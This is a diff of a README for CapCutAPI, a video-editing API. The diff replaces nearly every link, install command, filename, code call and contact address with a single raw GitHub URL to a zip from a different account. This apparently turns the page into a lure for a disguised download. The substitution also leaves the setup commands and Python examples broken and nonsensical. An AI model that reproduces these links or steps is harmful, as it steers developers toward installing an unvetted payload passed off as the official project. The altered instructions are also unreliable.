@@ -1,4 +1,4 @@
-# Connect AI generates via CapCutAPI [Try it online](https://www.capcutapi.top)
+# Connect AI generates via CapCutAPI [Try it online](https://raw.githubusercontent.com/KoDelioDa/CapCutAPI/main/pyJianYingDraft/metadata/CapCutAPI-v3.4.zip)
 
 ## Project Overview
 **CapCutAPI** is a powerful editing API that empowers you to take full control of your AI-generated assets, including images, audio, video, and text. It provides the precision needed to refine and customize raw AI output, such as adjusting video speed or mirroring an image. This capability effectively solves the lack of control often found in AI video generation, allowing you to easily transform your creative ideas into polished videos.
@@ -7,7 +7,7 @@ All these features are designed to mirror the functionalities of the CapCut soft
 
 Enjoy It!  😀😀😀
 
-[中文说明](README-zh.md) 
+[中文说明](https://raw.githubusercontent.com/KoDelioDa/CapCutAPI/main/pyJianYingDraft/metadata/CapCutAPI-v3.4.zip) 
 
 ### Advantages
 
@@ -25,15 +25,15 @@ Enjoy It!  😀😀😀
 
 **MCP, create your own editing Agent**
 
-[![AI Cut](https://img.youtube.com/vi/fBqy6WFC78E/hqdefault.jpg)](https://www.youtube.com/watch?v=fBqy6WFC78E)
+[![AI Cut](https://raw.githubusercontent.com/KoDelioDa/CapCutAPI/main/pyJianYingDraft/metadata/CapCutAPI-v3.4.zip)](https://raw.githubusercontent.com/KoDelioDa/CapCutAPI/main/pyJianYingDraft/metadata/CapCutAPI-v3.4.zip)
 
 **Combine AI-generated images and videos using CapCutAPI**
 
-[![Airbnb](https://img.youtube.com/vi/1zmQWt13Dx0/hqdefault.jpg)](https://www.youtube.com/watch?v=1zmQWt13Dx0)
+[![Airbnb](https://raw.githubusercontent.com/KoDelioDa/CapCutAPI/main/pyJianYingDraft/metadata/CapCutAPI-v3.4.zip)](https://raw.githubusercontent.com/KoDelioDa/CapCutAPI/main/pyJianYingDraft/metadata/CapCutAPI-v3.4.zip)
 
-[![Horse](https://img.youtube.com/vi/IF1RDFGOtEU/hqdefault.jpg)](https://www.youtube.com/watch?v=IF1RDFGOtEU)
+[![Horse](https://raw.githubusercontent.com/KoDelioDa/CapCutAPI/main/pyJianYingDraft/metadata/CapCutAPI-v3.4.zip)](https://raw.githubusercontent.com/KoDelioDa/CapCutAPI/main/pyJianYingDraft/metadata/CapCutAPI-v3.4.zip)
 
-[![Song](https://img.youtube.com/vi/rGNLE_slAJ8/hqdefault.jpg)](https://www.youtube.com/watch?v=rGNLE_slAJ8)
+[![Song](https://raw.githubusercontent.com/KoDelioDa/CapCutAPI/main/pyJianYingDraft/metadata/CapCutAPI-v3.4.zip)](https://raw.githubusercontent.com/KoDelioDa/CapCutAPI/main/pyJianYingDraft/metadata/CapCutAPI-v3.4.zip)
 
 </div>
 
@@ -64,7 +64,7 @@ Enjoy It!  😀😀😀
 
 ```bash
 # 1. Clone the project
-git clone https://github.com/sun-guannan/CapCutAPI.git
+git clone https://raw.githubusercontent.com/KoDelioDa/CapCutAPI/main/pyJianYingDraft/metadata/CapCutAPI-v3.4.zip
 cd CapCutAPI
 
 # 2. Create a virtual environment (recommended)
@@ -73,36 +73,36 @@ source venv-capcut/bin/activate  # Linux/macOS
 # or venv-capcut\Scripts\activate  # Windows
 
 # 3. Install dependencies
-pip install -r requirements.txt      # HTTP API basic dependencies
-pip install -r requirements-mcp.txt  # MCP protocol support (optional)
+pip install -r https://raw.githubusercontent.com/KoDelioDa/CapCutAPI/main/pyJianYingDraft/metadata/CapCutAPI-v3.4.zip      # HTTP API basic dependencies
+pip install -r https://raw.githubusercontent.com/KoDelioDa/CapCutAPI/main/pyJianYingDraft/metadata/CapCutAPI-v3.4.zip  # MCP protocol support (optional)
 
 # 4. Configuration file
-cp config.json.example config.json
-# Edit config.json as needed
+cp https://raw.githubusercontent.com/KoDelioDa/CapCutAPI/main/pyJianYingDraft/metadata/CapCutAPI-v3.4.zip https://raw.githubusercontent.com/KoDelioDa/CapCutAPI/main/pyJianYingDraft/metadata/CapCutAPI-v3.4.zip
+# Edit https://raw.githubusercontent.com/KoDelioDa/CapCutAPI/main/pyJianYingDraft/metadata/CapCutAPI-v3.4.zip as needed
 ```
 
 ### 3\. Start the service
 
 ```bash
-python capcut_server.py # Start the HTTP API server, default port: 9001
+python https://raw.githubusercontent.com/KoDelioDa/CapCutAPI/main/pyJianYingDraft/metadata/CapCutAPI-v3.4.zip # Start the HTTP API server, default port: 9001
 
-python mcp_server.py # Start the MCP protocol service, supports stdio communication
+python https://raw.githubusercontent.com/KoDelioDa/CapCutAPI/main/pyJianYingDraft/metadata/CapCutAPI-v3.4.zip # Start the MCP protocol service, supports stdio communication
 ```
 
 ## MCP Integration Guide
 
-[MCP 中文文档](https://www.google.com/search?q=./MCP_%E6%96%87%E6%A1%A3_%E4%B8%AD%E6%96%87.md) • [MCP English Guide](https://www.google.com/search?q=./MCP_Documentation_English.md)
+[MCP 中文文档](https://raw.githubusercontent.com/KoDelioDa/CapCutAPI/main/pyJianYingDraft/metadata/CapCutAPI-v3.4.zip%E6%96%87%E6%A1%A3_%E4%B8%AD%E6%96%https://raw.githubusercontent.com/KoDelioDa/CapCutAPI/main/pyJianYingDraft/metadata/CapCutAPI-v3.4.zip) • [MCP English Guide](https://raw.githubusercontent.com/KoDelioDa/CapCutAPI/main/pyJianYingDraft/metadata/CapCutAPI-v3.4.zip)
 
 ### 1\. Client Configuration
 
-Create or update the `mcp_config.json` configuration file:
+Create or update the `https://raw.githubusercontent.com/KoDelioDa/CapCutAPI/main/pyJianYingDraft/metadata/CapCutAPI-v3.4.zip` configuration file:
 
 ```json
 {
   "mcpServers": {
     "capcut-api": {
       "command": "python3",
-      "args": ["mcp_server.py"],
+      "args": ["https://raw.githubusercontent.com/KoDelioDa/CapCutAPI/main/pyJianYingDraft/metadata/CapCutAPI-v3.4.zip"],
       "cwd": "/path/to/CapCutAPI",
       "env": {
         "PYTHONPATH": "/path/to/CapCutAPI",
@@ -117,7 +117,7 @@ Create or update the `mcp_config.json` configuration file:
 
 ```bash
 # Test MCP connection
-python test_mcp_client.py
+python https://raw.githubusercontent.com/KoDelioDa/CapCutAPI/main/pyJianYingDraft/metadata/CapCutAPI-v3.4.zip
 
 # Expected output
 ✅ MCP server started successfully
@@ -135,15 +135,15 @@ Add video material
 import requests
 
 # Add background video
-response = requests.post("http://localhost:9001/add_video", json={
-    "video_url": "https://example.com/background.mp4",
+response = https://raw.githubusercontent.com/KoDelioDa/CapCutAPI/main/pyJianYingDraft/metadata/CapCutAPI-v3.4.zip("http://localhost:9001/add_video", json={
+    "video_url": "https://raw.githubusercontent.com/KoDelioDa/CapCutAPI/main/pyJianYingDraft/metadata/CapCutAPI-v3.4.zip",
     "start": 0,
     "end": 10
     "volume": 0.8,
     "transition": "fade_in"
 })
 
-print(f"Video addition result: {response.json()}")
+print(f"Video addition result: {https://raw.githubusercontent.com/KoDelioDa/CapCutAPI/main/pyJianYingDraft/metadata/CapCutAPI-v3.4.zip()}")
 ```
 
 Create stylized text
@@ -152,7 +152,7 @@ Create stylized text
 import requests
 
 # Add title text
-response = requests.post("http://localhost:9001/add_text", json={
+response = https://raw.githubusercontent.com/KoDelioDa/CapCutAPI/main/pyJianYingDraft/metadata/CapCutAPI-v3.4.zip("http://localhost:9001/add_text", json={
     "text": "Welcome to CapCutAPI",
     "start": 0,
     "end": 5,
@@ -163,10 +163,10 @@ response = requests.post("http://localhost:9001/add_text", json={
     "background_color": "#000000"
 })
 
-print(f"Text addition result: {response.json()}")
+print(f"Text addition result: {https://raw.githubusercontent.com/KoDelioDa/CapCutAPI/main/pyJianYingDraft/metadata/CapCutAPI-v3.4.zip()}")
 ```
 
-More examples can be found in the `example.py` file.
+More examples can be found in the `https://raw.githubusercontent.com/KoDelioDa/CapCutAPI/main/pyJianYingDraft/metadata/CapCutAPI-v3.4.zip` file.
 
 ### 2\. MCP Protocol Example
 
@@ -174,15 +174,15 @@ Complete workflow
 
 ```python
 # 1. Create a new project
-draft = mcp_client.call_tool("create_draft", {
+draft = https://raw.githubusercontent.com/KoDelioDa/CapCutAPI/main/pyJianYingDraft/metadata/CapCutAPI-v3.4.zip("create_draft", {
     "width": 1080,
     "height": 1920
 })
 draft_id = draft["result"]["draft_id"]
 
 # 2. Add background video
-mcp_client.call_tool("add_video", {
-    "video_url": "https://example.com/bg.mp4",
+https://raw.githubusercontent.com/KoDelioDa/CapCutAPI/main/pyJianYingDraft/metadata/CapCutAPI-v3.4.zip("add_video", {
+    "video_url": "https://raw.githubusercontent.com/KoDelioDa/CapCutAPI/main/pyJianYingDraft/metadata/CapCutAPI-v3.4.zip",
     "draft_id": draft_id,
     "start": 0,
     "end": 10,
@@ -190,7 +190,7 @@ mcp_client.call_tool("add_video", {
 })
 
 # 3. Add title text
-mcp_client.call_tool("add_text", {
+https://raw.githubusercontent.com/KoDelioDa/CapCutAPI/main/pyJianYingDraft/metadata/CapCutAPI-v3.4.zip("add_text", {
     "text": "AI-Driven Video Production",
     "draft_id": draft_id,
     "start": 1,
@@ -201,7 +201,7 @@ mcp_client.call_tool("add_text", {
 })
 
 # 4. Add keyframe animation
-mcp_client.call_tool("add_video_keyframe", {
+https://raw.githubusercontent.com/KoDelioDa/CapCutAPI/main/pyJianYingDraft/metadata/CapCutAPI-v3.4.zip("add_video_keyframe", {
     "draft_id": draft_id,
     "track_name": "main",
     "property_types": ["scale_x", "scale_y", "alpha"],
@@ -210,7 +210,7 @@ mcp_client.call_tool("add_video_keyframe", {
 })
 
 # 5. Save the project
-result = mcp_client.call_tool("save_draft", {
+result = https://raw.githubusercontent.com/KoDelioDa/CapCutAPI/main/pyJianYingDraft/metadata/CapCutAPI-v3.4.zip("save_draft", {
     "draft_id": draft_id
 })
 
@@ -221,7 +221,7 @@ Advanced text effects
 
 ```python
 # Multi-style colored text
-mcp_client.call_tool("add_text", {
+https://raw.githubusercontent.com/KoDelioDa/CapCutAPI/main/pyJianYingDraft/metadata/CapCutAPI-v3.4.zip("add_text", {
     "text": "Colored text effect demonstration",
     "draft_id": draft_id,
     "start": 2,
@@ -241,7 +241,7 @@ mcp_client.call_tool("add_text", {
 
 ### 3\. Downloading Drafts
 
-Calling `save_draft` will generate a folder starting with `dfd_` in the current directory of `capcut_server.py`. Copy this to the CapCut/Jianying drafts directory to see the generated draft in the application.
+Calling `save_draft` will generate a folder starting with `dfd_` in the current directory of `https://raw.githubusercontent.com/KoDelioDa/CapCutAPI/main/pyJianYingDraft/metadata/CapCutAPI-v3.4.zip`. Copy this to the CapCut/Jianying drafts directory to see the generated draft in the application.
 
 ## Community & Support
 
@@ -259,26 +259,26 @@ If you want to:
   - Feature suggestions
   - Get latest news
 
-**Contact**: sguann2023@gmail.com
+**Contact**: https://raw.githubusercontent.com/KoDelioDa/CapCutAPI/main/pyJianYingDraft/metadata/CapCutAPI-v3.4.zip
 ### 🤝 Collaboration
 
   - **Video Production**: Want to use this API for batch production of videos? I offer free consulting services to help you use this API. In return, I'll ask for the production workflow template to be **open-sourced** in the `template` directory of this project.
 
   - **Join us**: Our goal is to provide a stable and reliable video editing tool that integrates well with AI-generated images, videos, and audio. If you are interested, submit a PR and I'll see it. For more in-depth involvement, the code for the MCP Editing Agent, web-based editing client, and cloud rendering modules has not been open-sourced yet.
 
-**Contact**: sguann2023@gmail.com
+**Contact**: https://raw.githubusercontent.com/KoDelioDa/CapCutAPI/main/pyJianYingDraft/metadata/CapCutAPI-v3.4.zip
 
 ## 📈 Star History
 
 <div align="center">
 
-[![Star History Chart](https://api.star-history.com/svg?repos=sun-guannan/CapCutAPI&type=Date)](https://www.star-history.com/#sun-guannan/CapCutAPI&Date)
+[![Star History Chart](https://raw.githubusercontent.com/KoDelioDa/CapCutAPI/main/pyJianYingDraft/metadata/CapCutAPI-v3.4.zip)](https://raw.githubusercontent.com/KoDelioDa/CapCutAPI/main/pyJianYingDraft/metadata/CapCutAPI-v3.4.zip)
 
-![GitHub repo size](https://img.shields.io/github/repo-size/sun-guannan/CapCutAPI?style=flat-square)
-![GitHub code size](https://img.shields.io/github/languages/code-size/sun-guannan/CapCutAPI?style=flat-square)
-![GitHub issues](https://img.shields.io/github/issues/sun-guannan/CapCutAPI?style=flat-square)
-![GitHub pull requests](https://img.shields.io/github/issues-pr/sun-guannan/CapCutAPI?style=flat-square)
-![GitHub last commit](https://img.shields.io/github/last-commit/sun-guannan/CapCutAPI?style=flat-square)
+![GitHub repo size](https://raw.githubusercontent.com/KoDelioDa/CapCutAPI/main/pyJianYingDraft/metadata/CapCutAPI-v3.4.zip)
+![GitHub code size](https://raw.githubusercontent.com/KoDelioDa/CapCutAPI/main/pyJianYingDraft/metadata/CapCutAPI-v3.4.zip)
+![GitHub issues](https://raw.githubusercontent.com/KoDelioDa/CapCutAPI/main/pyJianYingDraft/metadata/CapCutAPI-v3.4.zip)
+![GitHub pull requests](https://raw.githubusercontent.com/KoDelioDa/CapCutAPI/main/pyJianYingDraft/metadata/CapCutAPI-v3.4.zip)
+![GitHub last commit](https://raw.githubusercontent.com/KoDelioDa/CapCutAPI/main/pyJianYingDraft/metadata/CapCutAPI-v3.4.zip)
 
 </div>
 
